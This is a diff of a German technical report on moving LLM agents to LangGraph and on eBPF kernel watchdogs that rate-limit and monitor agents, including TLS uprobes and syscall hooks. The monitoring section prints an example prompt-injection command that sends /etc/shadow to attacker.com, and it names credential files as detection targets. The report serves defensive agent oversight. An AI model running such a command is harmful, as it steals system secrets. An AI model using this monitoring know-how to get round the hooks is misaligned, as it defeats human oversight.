@@ -2,10 +2,10 @@
 
 **Zentrale Erkenntnisse und Überblick**
 
-*   **Deterministisches Routing durch LangGraph:** Die Forschung legt nahe, dass der Wechsel von einer maßgeschneiderten asynchronen Python-Zustandsmaschine zu LangGraph die Zuverlässigkeit von LLM-Agenten signifikant erhöht. Die Nutzung von `Command`-Objekten in Kombination mit Pydantic ermöglicht eine präzise Steuerung von Zustandsübergängen und Laufzeit-Routing [cite: 1, 2].
-*   **Volle eBPF-Unterstützung auf Hostinger VPS:** Da Hostinger für alle aktuellen Virtual Private Server (VPS) auf Kernel-based Virtual Machine (KVM) anstelle von containerbasierten Lösungen wie OpenVZ setzt, scheint es höchstwahrscheinlich, dass tiefgreifende Kernel-Eingriffe wie eBPF und XDP (eXpress Data Path) uneingeschränkt unterstützt werden [cite: 3].
-*   **Netzwerkbasierte Unterbindung von ReAct-Loops:** Die Implementierung von Kernel-Watchdogs via eBPF/XDP zur Begrenzung von ausgehendem API-Spam (Egress Rate Limiting) ist technisch machbar und extrem ressourceneffizient [cite: 4, 5].
-*   **Standard-Hooks für Agenten-Monitoring (2026):** Es zeichnet sich ab, dass der Standard für Zero-Instrumentation-Monitoring im Jahr 2026 auf einer Kombination aus Uprobes (für `SSL_read`/`SSL_write` zur TLS-Interception) und Kprobes/Tracepoints (für Syscalls wie `execve`, `connect`) basiert, um die Absichten des LLMs mit den tatsächlichen Systemaktionen zu korrelieren [cite: 6, 7].
+- **Deterministisches Routing durch LangGraph:** Die Forschung legt nahe, dass der Wechsel von einer maßgeschneiderten asynchronen Python-Zustandsmaschine zu LangGraph die Zuverlässigkeit von LLM-Agenten signifikant erhöht. Die Nutzung von `Command`-Objekten in Kombination mit Pydantic ermöglicht eine präzise Steuerung von Zustandsübergängen und Laufzeit-Routing [cite: 1, 2].
+- **Volle eBPF-Unterstützung auf Hostinger VPS:** Da Hostinger für alle aktuellen Virtual Private Server (VPS) auf Kernel-based Virtual Machine (KVM) anstelle von containerbasierten Lösungen wie OpenVZ setzt, scheint es höchstwahrscheinlich, dass tiefgreifende Kernel-Eingriffe wie eBPF und XDP (eXpress Data Path) uneingeschränkt unterstützt werden [cite: 3].
+- **Netzwerkbasierte Unterbindung von ReAct-Loops:** Die Implementierung von Kernel-Watchdogs via eBPF/XDP zur Begrenzung von ausgehendem API-Spam (Egress Rate Limiting) ist technisch machbar und extrem ressourceneffizient [cite: 4, 5].
+- **Standard-Hooks für Agenten-Monitoring (2026):** Es zeichnet sich ab, dass der Standard für Zero-Instrumentation-Monitoring im Jahr 2026 auf einer Kombination aus Uprobes (für `SSL_read`/`SSL_write` zur TLS-Interception) und Kprobes/Tracepoints (für Syscalls wie `execve`, `connect`) basiert, um die Absichten des LLMs mit den tatsächlichen Systemaktionen zu korrelieren [cite: 6, 7].
 
 Dieser Bericht richtet sich an Systemarchitekten, KI-Ingenieure und DevOps-Spezialisten, die komplexe, autonome Agentenarchitekturen entwickeln und in Produktion überführen wollen. Im ersten Teil wird detailliert analysiert, wie eine Migration von iterativen Python-Schleifen zu graphbasierten, zustandsbehafteten Frameworks wie LangGraph gelingt. Der zweite Teil widmet sich der Infrastrukturebene und evaluiert in einer umfassenden Machbarkeitsstudie, wie außer Kontrolle geratene Agenten (sogenannte ReAct-Loops) auf Kernel-Ebene gestoppt werden können, bevor sie massive API-Kosten verursachen. Dabei wird insbesondere auf die Gegebenheiten eines Hostinger-VPS und die neuesten eBPF-Technologien des Jahres 2026 eingegangen.
 
@@ -16,8 +16,9 @@ Autonome Agentensysteme, die auf Large Language Models (LLMs) basieren, haben si
 Parallel dazu birgt die Autonomie dieser Agenten erhebliche operationelle Risiken. Sogenannte **ReAct-Loops** (Reasoning and Acting) können in Endlosschleifen geraten, wenn das LLM ein Problem nicht lösen kann, aber weiterhin kontinuierlich APIs aufruft. Dies führt nicht nur zu sogenannten API-Spam-Ereignissen, sondern kann innerhalb weniger Minuten erhebliche finanzielle Schäden (Token-Kosten) verursachen oder externe Dienste durch unbeabsichtigte Denial-of-Service-Muster (DoS) überlasten [cite: 8, 9].
 
 Um diese beiden Herausforderungen zu meistern, bedarf es einer dualen Strategie:
-1.  **Auf der Applikationsebene:** Eine Migration hin zu einem deterministischen, graphenbasierten Routing-Framework wie LangGraph, welches Zustände transparent verwaltet und Übergänge strikt kontrolliert [cite: 2, 10].
-2.  **Auf der Infrastrukturebene:** Die Implementierung von ausfallsicheren Kernel-Watchdogs mittels Extended Berkeley Packet Filter (eBPF), um den Netzwerkverkehr von Agenten hart zu limitieren und systemübergreifend zu überwachen [cite: 11].
+
+1. **Auf der Applikationsebene:** Eine Migration hin zu einem deterministischen, graphenbasierten Routing-Framework wie LangGraph, welches Zustände transparent verwaltet und Übergänge strikt kontrolliert [cite: 2, 10].
+2. **Auf der Infrastrukturebene:** Die Implementierung von ausfallsicheren Kernel-Watchdogs mittels Extended Berkeley Packet Filter (eBPF), um den Netzwerkverkehr von Agenten hart zu limitieren und systemübergreifend zu überwachen [cite: 11].
 
 ## Vergleich: Custom Async-Python-StateMachine vs. LangGraph
 
@@ -30,18 +31,20 @@ Eine klassische Custom State Machine (z. B. eine `core_agent.py` eines OMEGA-Age
 Die Steuerung des Kontrollflusses (Routing) erfolgt durch imperativen Code. Nach jedem LLM-Aufruf wird die Antwort durch reguläre Ausdrücke oder rudimentäres JSON-Parsing analysiert. Basierend auf dem geparsten Ergebnis entscheidet ein zentraler Switch-Case-Block oder eine Kette von If-Else-Anweisungen, welche Funktion als Nächstes aufgerufen wird (z. B. `execute_tool()`, `ask_user()`, `finalize()`).
 
 Diese Architektur weist strukturelle Schwächen auf:
-*   **Mangelnder Determinismus:** LLMs sind von Natur aus nicht-deterministisch. Wenn das LLM ein unerwartetes Format zurückgibt, schlägt das Routing der State Machine fehl, was oft zu unkontrollierten Abstürzen oder Fallback-Endlosschleifen führt [cite: 12].
-*   **Spaghetti-Routing:** Bei Multi-Agenten-Systemen verschwimmen die Grenzen zwischen Zustand, Geschäftslogik und Routing. Das Hinzufügen neuer Tools oder Agenten erfordert tiefgreifende Änderungen an der zentralen Schleife [cite: 1].
-*   **Schwierige Nebenläufigkeit:** Die parallele Ausführung von Tools und die anschließende Zusammenführung der Ergebnisse in den Hauptzustand (Map-Reduce-Muster) sind in reinen While-Schleifen fehleranfällig und schwer zu synchronisieren [cite: 13].
+
+- **Mangelnder Determinismus:** LLMs sind von Natur aus nicht-deterministisch. Wenn das LLM ein unerwartetes Format zurückgibt, schlägt das Routing der State Machine fehl, was oft zu unkontrollierten Abstürzen oder Fallback-Endlosschleifen führt [cite: 12].
+- **Spaghetti-Routing:** Bei Multi-Agenten-Systemen verschwimmen die Grenzen zwischen Zustand, Geschäftslogik und Routing. Das Hinzufügen neuer Tools oder Agenten erfordert tiefgreifende Änderungen an der zentralen Schleife [cite: 1].
+- **Schwierige Nebenläufigkeit:** Die parallele Ausführung von Tools und die anschließende Zusammenführung der Ergebnisse in den Hauptzustand (Map-Reduce-Muster) sind in reinen While-Schleifen fehleranfällig und schwer zu synchronisieren [cite: 13].
 
 ### Die LangGraph-Architektur und das Pregel-Modell
 
 LangGraph, eine Erweiterung des LangChain-Ökosystems, adressiert diese Probleme durch die Modellierung von Agenten-Workflows als gerichtete Graphen (Directed Graphs). Das System basiert konzeptionell auf Googles Pregel-Algorithmus und verarbeitet Graphen in diskreten "Supersteps" durch Message-Passing [cite: 2]. 
 
 Die Architektur besteht aus drei Kernkomponenten [cite: 2]:
-1.  **State (Zustand):** Eine strikt typisierte Datenstruktur, die von allen Knoten geteilt wird.
-2.  **Nodes (Knoten):** Python-Funktionen, die den Zustand lesen, Berechnungen (z. B. LLM-Aufrufe) durchführen und ein Update des Zustands zurückgeben.
-3.  **Edges (Kanten):** Funktionen, die bestimmen, welcher Knoten nach dem aktuellen ausgeführt wird.
+
+1. **State (Zustand):** Eine strikt typisierte Datenstruktur, die von allen Knoten geteilt wird.
+2. **Nodes (Knoten):** Python-Funktionen, die den Zustand lesen, Berechnungen (z. B. LLM-Aufrufe) durchführen und ein Update des Zustands zurückgeben.
+3. **Edges (Kanten):** Funktionen, die bestimmen, welcher Knoten nach dem aktuellen ausgeführt wird.
 
 Anstatt einer zentralen Schleife iteriert der LangGraph-Executor autonom über den Graphen, basierend auf den definierten Kanten.
 
@@ -164,9 +167,10 @@ Wie aus den technischen Dokumentationen von Hostinger (Stand 2025/2026) hervorge
 KVM ist eine Full-Virtualization-Lösung (Typ-1-ähnlicher Hypervisor), die dem VPS nicht nur separate Hardwareressourcen (AMD EPYC Prozessoren, NVMe SSDs), sondern auch einen **vollständig isolierten und eigenständigen Linux-Kernel** zur Verfügung stellt [cite: 20]. 
 
 Daraus ergeben sich für eBPF folgende Möglichkeiten:
-*   **Voller Root-Zugriff:** Nutzer können die neuesten Linux-Kernel (z. B. Version 6.x) via OS-Templates (Ubuntu 24.04 oder 25.04) installieren, welche essenziell für aktuelle eBPF-Features sind [cite: 3, 21].
-*   **Keine Kernel-Einschränkungen:** Da der Kernel nicht mit anderen Mietern geteilt wird, greift der eBPF-Verifier uneingeschränkt, und Programme können mittels `bpf()` Syscall geladen werden [cite: 18].
-*   **Ressourcen:** Selbst der kleinste Plan (KVM 1: 1 vCPU, 4GB RAM) reicht für minimale eBPF-Sonden aus, wenngleich für intensive Paketinspektionen Pläne ab KVM 2 oder KVM 4 empfohlen werden [cite: 20, 22].
+
+- **Voller Root-Zugriff:** Nutzer können die neuesten Linux-Kernel (z. B. Version 6.x) via OS-Templates (Ubuntu 24.04 oder 25.04) installieren, welche essenziell für aktuelle eBPF-Features sind [cite: 3, 21].
+- **Keine Kernel-Einschränkungen:** Da der Kernel nicht mit anderen Mietern geteilt wird, greift der eBPF-Verifier uneingeschränkt, und Programme können mittels `bpf()` Syscall geladen werden [cite: 18].
+- **Ressourcen:** Selbst der kleinste Plan (KVM 1: 1 vCPU, 4GB RAM) reicht für minimale eBPF-Sonden aus, wenngleich für intensive Paketinspektionen Pläne ab KVM 2 oder KVM 4 empfohlen werden [cite: 20, 22].
 
 **Fazit der Machbarkeit:** Die Implementierung von eBPF-basierten Kernel-Watchdogs auf einem modernen Hostinger KVM-VPS ist **ohne Einschränkungen technisch machbar**. Die KVM-Virtualisierung bietet die exakt gleiche eBPF-Kompatibilität wie ein dedizierter Bare-Metal-Server.
 
@@ -186,16 +190,18 @@ Historisch bedingt war XDP strikt auf eingehenden Verkehr (Ingress) limitiert, d
 ### Architektur des Kernel-Watchdogs
 
 Ein eBPF-Watchdog zur Unterbindung von API-Spam besteht aus zwei Komponenten:
-1.  **eBPF-Maps:** Hochperformante In-Kernel-Key-Value-Stores. Diese speichern Metriken wie "Anzahl der API-Aufrufe pro Ziel-IP innerhalb der letzten Sekunde" [cite: 5].
-2.  **Das XDP/TC-Programm:** Wird bei jedem ausgehenden Paket ausgeführt.
+
+1. **eBPF-Maps:** Hochperformante In-Kernel-Key-Value-Stores. Diese speichern Metriken wie "Anzahl der API-Aufrufe pro Ziel-IP innerhalb der letzten Sekunde" [cite: 5].
+2. **Das XDP/TC-Programm:** Wird bei jedem ausgehenden Paket ausgeführt.
 
 **Ablauf (Rate Limiting via Token Bucket):**
-1.  Der LLM-Agent (Python-Prozess) initiiert einen HTTPS-Request an eine externe API.
-2.  Das Paket durchläuft den Kernel in Richtung Netzwerkschnittstelle.
-3.  Das angehängte eBPF-Programm fängt das Paket ab und extrahiert die Ziel-IP-Adresse aus dem IPv4/IPv6-Header [cite: 5, 26].
-4.  Das Programm schlägt die Ziel-IP in einer eBPF-Map vom Typ `BPF_MAP_TYPE_LRU_HASH` nach [cite: 5].
-5.  Ein Timestamp und ein Paket-/Request-Zähler werden evaluiert. Überschreitet der Zähler einen definierten Schwellenwert (z.B. > 5 Requests pro Sekunde zu Anthropic), gibt das eBPF-Programm sofort den Befehl `TC_ACT_SHOT` (bzw. `XDP_DROP`) zurück [cite: 24, 25, 26].
-6.  Das Paket wird direkt im Kernel vernichtet, bevor es das Netzwerk verlässt. Der Python-Prozess (Agent) erhält einen Connection Timeout oder OSError und wird physisch daran gehindert, weiteren API-Spam zu versenden.
+
+1. Der LLM-Agent (Python-Prozess) initiiert einen HTTPS-Request an eine externe API.
+2. Das Paket durchläuft den Kernel in Richtung Netzwerkschnittstelle.
+3. Das angehängte eBPF-Programm fängt das Paket ab und extrahiert die Ziel-IP-Adresse aus dem IPv4/IPv6-Header [cite: 5, 26].
+4. Das Programm schlägt die Ziel-IP in einer eBPF-Map vom Typ `BPF_MAP_TYPE_LRU_HASH` nach [cite: 5].
+5. Ein Timestamp und ein Paket-/Request-Zähler werden evaluiert. Überschreitet der Zähler einen definierten Schwellenwert (z.B. > 5 Requests pro Sekunde zu Anthropic), gibt das eBPF-Programm sofort den Befehl `TC_ACT_SHOT` (bzw. `XDP_DROP`) zurück [cite: 24, 25, 26].
+6. Das Paket wird direkt im Kernel vernichtet, bevor es das Netzwerk verlässt. Der Python-Prozess (Agent) erhält einen Connection Timeout oder OSError und wird physisch daran gehindert, weiteren API-Spam zu versenden.
 
 Dieser Mechanismus ist immun gegen Bugs in der Applikationslogik, da er auf Betriebssystemebene durchgesetzt wird. Die Sicherheit wird durch den eBPF-Verifier garantiert, der sicherstellt, dass das Watchdog-Programm das System nicht zum Absturz bringt (z. B. durch Verbot von Endlosschleifen im eBPF-Code) [cite: 18].
 
@@ -213,8 +219,8 @@ Der gesamte Verkehr zwischen dem Agenten und dem LLM-Provider (OpenAI, lokales O
 
 Der eBPF-Standard 2026 löst dies elegant durch **Uprobes (User-land Probes)**. Alle SSL/TLS-Bibliotheken (wie OpenSSL oder BoringSSL) müssen zwangsläufig Funktionen aufrufen, um Daten vor dem Senden zu verschlüsseln oder nach dem Empfang zu entschlüsseln [cite: 7]. 
 
-*   **Hook 1:** `uprobe` auf den Einstiegspunkt der Funktion `SSL_write()` (oder `SSL_write_ex`). Hier liegt der LLM-Prompt (die Anfrage des Agenten) noch unverschlüsselt als Klartext im Arbeitsspeicher des Userspaces vor [cite: 30, 31, 32]. Das eBPF-Programm kopiert den Plaintext sicher in einen Perf-Buffer oder Ring-Buffer [cite: 7].
-*   **Hook 2:** `uretprobe` (Return Probe) auf das Ende der Funktion `SSL_read()`. Zu diesem Zeitpunkt hat die Krypto-Bibliothek die Antwort des LLMs entschlüsselt, und der Text (die Antwort/Anweisung des Modells) kann im Klartext abgegriffen werden [cite: 7, 30, 31].
+- **Hook 1:** `uprobe` auf den Einstiegspunkt der Funktion `SSL_write()` (oder `SSL_write_ex`). Hier liegt der LLM-Prompt (die Anfrage des Agenten) noch unverschlüsselt als Klartext im Arbeitsspeicher des Userspaces vor [cite: 30, 31, 32]. Das eBPF-Programm kopiert den Plaintext sicher in einen Perf-Buffer oder Ring-Buffer [cite: 7].
+- **Hook 2:** `uretprobe` (Return Probe) auf das Ende der Funktion `SSL_read()`. Zu diesem Zeitpunkt hat die Krypto-Bibliothek die Antwort des LLMs entschlüsselt, und der Text (die Antwort/Anweisung des Modells) kann im Klartext abgegriffen werden [cite: 7, 30, 31].
 
 Dieser Zero-Instrumentation-Ansatz ermöglicht es, jede LLM-Interaktion in Echtzeit zu lesen, ohne den Quellcode des Agenten zu modifizieren oder Netzwerk-Zertifikate zu injizieren [cite: 19, 23].
 
@@ -223,19 +229,21 @@ Dieser Zero-Instrumentation-Ansatz ermöglicht es, jede LLM-Interaktion in Echtz
 Während die Uprobes verraten, was das LLM "denkt" (Intent), überwachen eBPF-Hooks im Kernel-Space, was der Agent "tut" (Action). Da Agenten Werkzeuge aufrufen, müssen die resultierenden Systemaufrufe (Syscalls) observiert werden [cite: 9, 28, 29].
 
 Die Standard-Hooks 2026 umfassen:
-*   **Tracepoint auf `sched_process_exec` oder Kprobe auf `execve` / `execveat`:** Erfasst die Ausführung von Subprozessen. Wenn der Agent heimlich ein Bash-Skript oder eine Python-Umgebung (`subprocess.Popen`) startet, fängt dieser Hook den exakten Befehl und die Argumente ab [cite: 6, 9]. Hierdurch werden Tool-Ausführungen sicher protokolliert.
-*   **Kprobe auf `openat2` / `vfs_read` / `vfs_write`:** Überwacht Dateisystemzugriffe. Versucht der Agent kritische Dateien (wie `/etc/passwd` oder `.env`-Dateien mit API-Keys) zu lesen, wird dies sofort erkannt, selbst wenn es durch tief verschachtelte Skripte geschieht [cite: 6].
-*   **Kprobe auf `connect`:** Überwacht den Aufbau von TCP/UDP-Verbindungen (Sockets). Dies erkennt Exfiltrationen (z. B. wenn das Agenten-Skript via `curl` Daten an einen externen Angreifer-Server sendet).
+
+- **Tracepoint auf `sched_process_exec` oder Kprobe auf `execve` / `execveat`:** Erfasst die Ausführung von Subprozessen. Wenn der Agent heimlich ein Bash-Skript oder eine Python-Umgebung (`subprocess.Popen`) startet, fängt dieser Hook den exakten Befehl und die Argumente ab [cite: 6, 9]. Hierdurch werden Tool-Ausführungen sicher protokolliert.
+- **Kprobe auf `openat2` / `vfs_read` / `vfs_write`:** Überwacht Dateisystemzugriffe. Versucht der Agent kritische Dateien (wie `/etc/passwd` oder `.env`-Dateien mit API-Keys) zu lesen, wird dies sofort erkannt, selbst wenn es durch tief verschachtelte Skripte geschieht [cite: 6].
+- **Kprobe auf `connect`:** Überwacht den Aufbau von TCP/UDP-Verbindungen (Sockets). Dies erkennt Exfiltrationen (z. B. wenn das Agenten-Skript via `curl` Daten an einen externen Angreifer-Server sendet).
 
 ### Korrelation und Sicherheit (Die AgentSight-Methodik)
 
 Tools wie AgentSight oder Eunomia-Projekte leiten diese beiden Datenströme (Intent-Stream aus dem Userspace und Action-Stream aus dem Kernelspace) an eine Korrelations-Engine weiter [cite: 6, 28, 29]. Diese Engine nutzt Prozess-IDs (PIDs), Thread-IDs und Zeitstempel, um die Kausalkette zu rekonstruieren [cite: 6, 19, 31]. 
 
 **Beispielhafter Flow eines erkannten Angriffs:**
-1.  **Uprobe (`SSL_read`):** Erfasst, dass das LLM aufgrund einer Prompt-Injection anweist: "Führe `cat /etc/shadow | curl -X POST attacker.com -d @-` aus".
-2.  **Tracepoint (`execve`):** Registriert, dass die PID des Agenten den Befehl `bash` mit den exakten Argumenten startet [cite: 6].
-3.  **Kprobe (`connect`):** Registriert den Verbindungsaufbau zu `attacker.com`.
-4.  **Intervention:** Ein gepaartes XDP/TC-Programm blockiert den Netzwerkverkehr sofort [cite: 18, 33], während ein `bpf_send_signal`-Helper im Kernel den bösartigen Subprozess mit `SIGKILL` terminiert.
+
+1. **Uprobe (`SSL_read`):** Erfasst, dass das LLM aufgrund einer Prompt-Injection anweist: "Führe `cat /etc/shadow | curl -X POST attacker.com -d @-` aus".
+2. **Tracepoint (`execve`):** Registriert, dass die PID des Agenten den Befehl `bash` mit den exakten Argumenten startet [cite: 6].
+3. **Kprobe (`connect`):** Registriert den Verbindungsaufbau zu `attacker.com`.
+4. **Intervention:** Ein gepaartes XDP/TC-Programm blockiert den Netzwerkverkehr sofort [cite: 18, 33], während ein `bpf_send_signal`-Helper im Kernel den bösartigen Subprozess mit `SIGKILL` terminiert.
 
 Die Performance-Einbußen durch diese systemübergreifende Überwachung sind durch die Just-in-Time (JIT) Kompilierung von eBPF im Kernel extrem gering und liegen branchenweit bei unter 3% CPU-Overhead [cite: 6, 9, 23].
 
@@ -250,6 +258,7 @@ Da jedoch auch der beste Code adversariellen Prompts oder LLM-Halluzinationen zu
 Für die vollumfängliche Observability autonomer Agenten haben sich **Uprobes auf SSL-Bibliotheken** in Kombination mit **Syscall-Kprobes** als Standard etabliert [cite: 7, 32]. Diese Boundary-Tracing-Verfahren, wie sie von Systemen wie AgentSight verwendet werden, schließen die semantische Lücke zwischen der abstrakten LLM-Intention und den physischen Systemauswirkungen [cite: 9, 28, 29]. Sie stellen sicher, dass auch hochentwickelte, mehrschichtige KI-Systeme vorhersehbar, kontrollierbar und budgetsicher in Produktion betrieben werden können.
 
 **Sources:**
+
 1. [dev.to](https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQHll-dvy85fM0fTj2VqIg7--8xc31EyfxSNUmlk8BGtIzf1iyOVVI_DFpi_prptSrP3ShInw93VDqDe-dum-JfqEZt_D_LP3QzLNKfo38pvDVBRNnu2yjxHKh2icbzJbUrhgEqt-OyWKoMoqakAw57Onb0ctPuJd7Aftk4UTEGKiSm-cBzqhhktPRVattdkzosPJtiIkA==)
 2. [langchain.com](https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQFTOQPuLo7KHifUh0zmOpwy-75p4u1Sn-Y56Vk_ZetpxuWMhwBCCrVjf-GH4l04X2Lc_DR5Jeoa2FYGnwNXMryyQc-qeXEziIrdxGcKlol5bK9h2vto3edFRyqq1WNYe53H_KOzLC3128LW2WBF5g==)
 3. [hostinger.com](https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQHXzz9xJbf--1kSmOYA9rcTcvV0Qzmejined2JyH2vLHn1myoIo5SfS_Fg9JtTeYn-3c8cQnQcyFjUJ9J8Fcfz_MKFMhGWr-Hcv98XOM3G8uGHIVMbchZSZk2k6lVM5Ja-0T8wgGb8VE2I_zfwx54Z0ku0lIgi_BKoSnyIg-P-xLJVBRmY0rw4=)
@@ -283,6 +292,5 @@ Für die vollumfängliche Observability autonomer Agenten haben sich **Uprobes a
 31. [medium.com](https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQFt4R1tfmdRiOUFzrcxtJ9fO7DVWKbRtPNOeZgmQ6HFkNOy-P5z7Bej2WRVINEY0mBJ6ZwSJxaHnd8OWaAZhMD3s_yXZfVpBU57BVCsAgKFIZDIn4y_EUciTAKsoAEfn5ZRyyT2wMoTZHytpJDr15cpf6qTU8llh2efDfLnfYIpHRmU_ozAD6tLAv8bkv-SAwjUi5kWXUFGKeQHIZV2HX65rw==)
 32. [quarkslab.com](https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQEQ1zcHVnvrR3jC2SA6a7MspCkC0ysE68LTTeO5yEJnUoSFv0oNxcibIk8xkfj_Y9fDgxvpyNVdoLyoWZv9SZT5rj8oByr9KlZiS0ExbVA0dG8Y_F4hbChJP3giygW_iZ-Qy6p12dKKnytSSahvDlFU7GksPOU=)
 33. [arxiv.org](https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQHRLzEj3ghAgBkcgUvKj400eVY_Rb6rs-mnkmJguZPcD-6b4-5Axa08hXsjyoAkGDj2Txs_6v--wtPxXMaIAysZbaxkAN4Cblr5o5hXXIVXhX66v_53Yc6N)
-
 
 [LEGACY_UNAUDITED]
